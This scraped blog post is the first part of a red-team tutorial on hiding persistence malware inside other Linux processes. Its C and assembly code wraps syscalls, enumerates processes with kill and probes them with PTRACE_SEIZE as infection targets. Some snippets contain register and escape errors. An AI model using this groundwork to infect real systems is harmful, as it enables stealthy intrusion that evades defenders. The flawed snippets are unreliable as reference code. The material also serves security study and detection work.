@@ -1,0 +1,365 @@
+filename: c-linux-process-infection-20250909.txt
+https://www.tarlogic.com/blog/linux-process-infection/
+
+Linux process infection
+21. Dec. 2018
+
+   Among the different tasks that a Red Teaming operations should carry out, there is one that is
+   remarkable by its intrinsic craftsmanship: putting an APT inside a computer system and ensuring
+   its persistence. Unfortunately, most of this persistence mechanisms are based on keeping copies of an
+   executable file in different locations, with one or more activation techniques (e.g. shell scripts,
+   aliases, links, system boot scripts, etc.), and therefore a Blue Team's security expert or a
+   Threat Hunting team would only need to locate a working copy of the file and analyze it in
+   his/her computer.
+
+   Although the security expert will find out what is going on sooner or later, it's also true that some
+   techniques can be implemented in order to difficult (or at least, delay) the detection of the APT in
+   the infected machine. In this series of articles, we will detail a persistence mechanism based on the
+   process tree instead of regular filesystem-based storage.
+
+Prerequisites
+   This technique will be carried out in a x86-64 GNU/Linux, although the theory could be easily
+   extended to any operating system with a more or less complete debugging API. The requisites would
+   be minimal: any modern GCC version would do the job.
+
+Using the address space of other processes as warehouse
+   The intuition behind this technique is to use the address space of the running non-privileged
+   processes as a storage area by injecting two threads in them: the first thread would try to infect
+   the rest of processes, while the other will contain the payload (which, in this case, will just
+   ensure file-system persistence). If the file is deleted, it will be restored with a different name.
+
+   It's important to have in mind that this technique will be strongly limited by the machine's uptime,
+   and therefore it should be used in systems that are not intended to be frequently restarted. In other
+   systems, it could be seen as a complementary persistence mechanism.
+
+Shaping the injection
+   Obviously, one of the most critical phases of this technique is the code injection itself. As it's
+   impossible to know where the code will be placed beforehand in the victim's address space, the code
+   should be PIC (position-independent code). This suggests almost immediately the usage of dynamic
+   libraries, as they can be laid out in memory practically "as is". However, this has some cons:
+     * Most of the injected information will be metadata (headers and son on)
+     * The code necessary to parse and load a library, although not being excessively complex, will not
+       be negligible in comparison with the payload's size
+     * Shared libraries use a broadly known file format, and make the resulting file easily analyzable
+
+   Ideally, the injection would be as small as possible: a couple of code pages, maybe an additional
+   page for data and that would be it. All this is possible with linker scripts. However, for this proof
+   of concept, we will content ourselves with a shared library as "first container".
+
+   Another restriction to have in mind is that the target process does not need to be loaded as a
+   dynamic executable (and, therefore, the C library may not be dynamically loaded). Also, manual symbol
+   resolution on a loaded shared library is painful, ABI-dependent and barely maintainable. This means
+   that many standard C functions will be reimplemented by hand.
+
+   Also, this injection will be based on the ptrace system call. If the process is not privileged enough
+   (or this feature is explicitly disabled by the administrator), this technique will simply not work.
+
+   And finally, restrictions on dynamic memory usage will show up too. The usage of dynamic memory
+   involves dealing with the heap, whose internal structure is far from being standard. In general, it
+   is not desirable to keep a large memory footprint in the program's address space. Dynamic memory
+   should be used seldom to reduce the footprint as much as possible.
+
+Roadmap
+   This proof of concept will do the following:
+     * The library will hold 2 entry points. The location of these entry points will be known beforehand
+       (as they would be at fixed distance from the beginning of the executable) and will correspond to
+       the beginning of the main function of the injected threads.
+     * The infection thread will list every running process in the system, locating those that can be
+       potentially attacked.
+     * A ptrace(PTRACE_SEIZE) will be attempted against each process, and its memory read in order to
+       detect whether it is already infected.
+     * In order to prepare the target address space, system calls must be injected. These system calls
+       must allocate the necessary memory pages to store the injected code.
+     * Spawn both threads and continue the execution of the debugged process.
+
+   Each one of these phases requires some careful preparation that will be detailed in the following
+   sections.
+
+Preparing the environment
+   In order to keep the code as clean as possible, a small C program compiled as shared library will be
+   used as starting point. Additionally, in order to run tests before the program is totally autonomous,
+   another small C program that runs specific symbols in a library will be provided. In order to ease
+   the overall development, a Makefile with all the build rules will be also included.
+
+   For the entry points of the injectable library, the following template will be used:
+
+void persist(void) {
+	/* Implement me */
+}
+
+void propagate(void) {
+	/* Implement me */
+}
+
+   The program that will perform the initial execution of the entry points will be named "spawn.c" and
+   will look like this:
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <dlfcn.h>
+
+int main(int argc, char *argv[]) {
+	void *handle;
+	void (*entry)(void);
+
+	if (argc != 3) {
+		fprintf(stderr, "Usage\n%s file symbol\n", argv[0]);
+		exit(EXIT_FAILURE);
+	}
+
+	if ((handle = dlopen(argv[1], RTLD_NOW)) == NULL) {
+		fprintf(stderr, "%s: failed to load %s: %s\n", argv[0], argv[1], dlerror());
+		exit(EXIT_FAILURE);
+	}
+
+	if ((entry = dlsym(handle, argv[2])) == NULL) {
+		fprintf(stderr, "%s: symbol `%s' not found in %s\n", argv[0], argv[2], argv[1]);
+		exit(EXIT_FAILURE);
+	}
+
+	printf("Symbol '%s' found in %p. Jumping to function...\n", argv[2], entry);
+
+	(entry) ();
+
+	printf("Function returned!\n");
+
+	dlclose(handle);
+	return 0;
+}
+
+   And finally, the Makefile that will compile both programs will be the following:
+
+CC=gcc
+INF_CFLAGS=--shared -fPIE -fPIC -nostdlib
+
+all : injectable.so spawn
+
+injectable.so : injectable.c
+	$(CC) $(INF_CFLAGS) injectable.c -o injectable.so
+
+spawn : spawn.c
+	$(CC) spawn.c -o spawn -ldl
+
+   And it will be enough by running make to compile everything:
+$> make
+(...)
+$> ./spawn ./injectable.so propagate
+Symbol 'propagate' found in 0x7ffff76352ea. Jumping to function...
+Function returned!
+
+System calls
+   One noticeable apect about the Makefile above is that injectable.so is being compiled with -nostdlib
+   (this was a requisite), and therefore we will not have access to the high level C system call
+   interface. To overcome this restriction, a set of hybrid C and inline assembly will be needed in
+   order to interact with the operating system.
+
+   As general rule, x86-64 Linux system calls are performed through the syscall instruction (while in
+   older x86 systems interrupt 0x80 was used instead). In any case, the underlying idea is the same:
+   registers are populated with system call arguments and then the system is called via some special
+   instruction. The contents of %rax are initialized with the system call function code, and its
+   arguments are passed in order %rdi, %rsi, %rdx, %r10, %r8 and %r9. The return value is stored in
+   %rax, and errors are signaled with a negative return value (which corresponds to the inverted errno
+   value). So, a simple "hello world" in assembly using the write() system call may look like this:
+
+    movq $1, %rax               // Syscall code for write(): 1
+    movq $1, %rdi               // Arg 1: File descriptor (stdout)
+    leaq %rip(greeting), %rsi   // Arg 2: Buffer address
+    movq $12, %rdx              // Arg 3: size (12 bytes)
+    syscall                     // All set, call the kernel
+[...]
+greeting: .ascii "Hello worldn"
+
+   Using assembly code in C is rather easy thanks to the inline assembly syntax of GCC, and due to its
+   expressivity, it can be condensed in a single sentence. A write wrapper for GCC can be reduced to:
+
+#include <unistd.h>
+#include <syscall.h>
+
+ssize_t write(int fd, const void *buffer, size_t size) {
+	size_t result;
+	asm volatile("syscall" : "=a" (result) : "a" (__NR_write), "S" (fd), "D" (buffer), "d" (size));
+	return result;
+}
+
+   The values passed after "syscall" specify how registers should be initialized before executing the
+   assembly code. In this case, %rax (specifier "a") is initialized with __NR_write (a macro that
+   expands to the system call code for write, as defined in syscall.h), %rdi (specifier "D") with the
+   buffer address and %rsi (specifier "S") with the string size. The returned value is collected back in
+   %rax (specifier "=a", the equals sign means that "result" is a write only value and the compiler
+   should not worry about its initial value).
+
+   Since string parsing is a common task in many programs and this one will not be an exception, it's
+   convenient now to write an implementation of strlen (following the prototype in string.h) to measure
+   string lengths:
+
+size_t strlen(const char *buffer) {
+	size_t len = 0;
+	while (*buffer++)
+		++len;
+	return len;
+}
+
+   Which allows the definition of the following macro:
+
+#define puts(string) write(1, string, strlen(string))
+
+   Which provides a simple way to display debug messages in the standard output:
+
+void persist(void) {
+	puts("This is persist()n");
+}
+
+void propagate(void) {
+	puts("This is propagate()n");
+}
+
+   And once run, they should produce the following output:
+$> ./spawn ./injectable.so persist
+Symbol 'persist' found in 0x7f3eb58403be. Jumping to function...
+This is persist()
+Function returned!
+$> ./spawn ./injectable.so propagate
+Symbol 'propagate' found in 0x7fb8874403db. Jumping to function...
+This is propagate()
+Function returned!
+
+   And therefore, the first difficulty would be resolved: from now on, for any missing system call
+   functionality, a corresponding C wrapper should be implemented, and required library functions (like
+   strlen) should be implemented following their corresponding standard header prototypes as we need
+   them.
+
+Enumerating processes
+   In order to inject the malicious code in other processes, the first step is to be aware of the
+   available processes in the system. There are two ways to do this:
+     * Accessing /proc and listing all directories, or
+     * Probe all system PIDs with kill, from PID 2 to a given PID_MAX
+
+   Although the first method seems the fastest, it is also the most complex because:
+    1. /proc may not be even mounted.
+    2. Linux lacks an opendir/readdir system call pair to deal with directories. It is actually based on
+       open / getdents, returning the latter a buffer of variable size structures that should be
+       processed manually.
+    3. Filenames must be converted to integer manually in order to extract the PID they refer to.
+       Because we don't have access to library function, such conversion feature should also be
+       implemented manually.
+
+   The second method, even though slower in appearance, works in practically every modern operating
+   system. In this method, kill is called several times with signal 0 in a range of PIDs, which returns
+   0 if the PID exists and the calling process can send signals to it (which in turn is related on how
+   privileged the calling process is), or an error code otherwise.
+
+   The only unknown here is the PID_MAX which is not necessarily the same for every system. Fortunately,
+   in the vast majority of cases, PID_MAX is set to its default value (32768). Since kill is very fast
+   when no signal is sent, calling kill 33000 times seems feasible.
+
+   In order to use this technique, a wrapper for kill will be necessary. A loop will traverse all
+   possible PIDs between 2 and 32768 (as PID 1 is reserved for init), and print a message for every
+   process found:
+
+int kill(pid_t pid, int sig) {
+	int result;
+	asm volatile("syscall" : "=a" (result) : "a" (__NR_kill), "D" (pid), "S" (sig));
+	return result;
+}
+
+   At this point, it is interesting to write down a function to print numbers in base 10:
+
+void puti(unsigned int num) {
+	unsigned int max = 1000000000;
+	char c;
+	unsigned int msd_found = 0;
+
+	while (max > 0) {
+		c = '0' + num / max;
+		msd_found |= c != '0' || max == 1;
+
+		if (msd_found)
+			write(1, &c, 1);
+
+		num %= max;
+		max /= 10;
+	}
+}
+
+   And what remains now is to modify propagate() in order to carry out the enumeration:
+
+void propagate(void) {
+	pid_t pid;
+
+	for (pid = 2; pid < PID_MAX; ++pid) if (kill(pid, 0) >= 0) {
+		puts("Process found: ");
+		puti(pid);
+		puts("\n");
+	}
+}
+
+   After compiling, we should expect a result like this:
+$> ./spawn ./injectable.so propagate
+Process found: 1159
+Process found: 1160
+Process found: 1166
+Process found: 1167
+Process found: 1176
+Process found: 1324
+Process found: 1328
+Process found: 1352
+...
+
+   For a regular desktop GNU/Linux distribution, it's common to find more than one hundred user
+   processes to whom a signal may be sent. This is equivalent to say that there is more than one hundred
+   possible infection targets.
+
+Attempting PTRACE_SEIZE
+   This is the main weak spot of this technique: some of the enumerated processes above cannot be
+   debugged due to access restrictions (e.g. setuid processes). A call to ptrace(PTRACE_SEIZE) on every
+   found process can be used to identify which ones are debuggable.
+
+   Although the first thing that comes to one's mind when debugging a running program is using
+   PTRACE_ATTACH, this technique has side effects: in case of success, it will stop the debuggee until
+   it is resumed with PTRACE_CONT. This may affect the target process (especially if it is sensitive to
+   timing) and therefore make it noticeable to the user.  PTRACE_SEIZE (introduced in Linux 3.4),
+   however, does not stop the target process.
+
+   Since according to libc, ptrace is a variadic function, it is convenient to simplify the wrapper's
+   prototype by always accepting 4 arguments, populating them or not depending on the requested command:
+
+long ptrace4(int request, pid_t pid, void *addr, void *data) {
+	long result;
+	register void *r10 asm("r10") = data;
+	asm volatile("syscall" : "=a" (result) : "a" (__NR_ptrace), "S" (pid), "D" (request), "d" (addr));
+	return result;
+}
+
+   And propagate will now look like this:
+
+void propagate(void) {
+	pid_t pid;
+	int err;
+
+	for (pid = 2; pid < PID_MAX; ++pid) if (kill(pid, 0) >= 0) {
+		puts("Process found: ");
+		puti(pid);
+		puts(": ");
+		if ((err = ptrace4(PTRACE_SEIZE, pid, NULL, NULL)) >= 0) {
+			puts("seizable!\n");
+			ptrace4(PTRACE_DETACH, pid, NULL, NULL);
+		} else {
+			puts("but cannot be debugged : ( [errno=");
+			puti(-err);
+			puts("]\n");
+		}
+	}
+}
+
+   Which will list all debuggable processes on the system.
+
+Conclusions (by now)
+   The previous tests gave us a quick glimpse of the feasibility of this technique. From here on out,
+   the rest of the coding will be not too far from what we would expect from a regular debugger, being
+   the biggest difference that our code will run in an automatic fashion. In the next post, we will see
+   how to seize a system of the debuggee to inject system calls of our own remotely. These remote system
+   calls will be used to create the code and data pages upon which the injected threads will be spawned.
+
+
+---
+
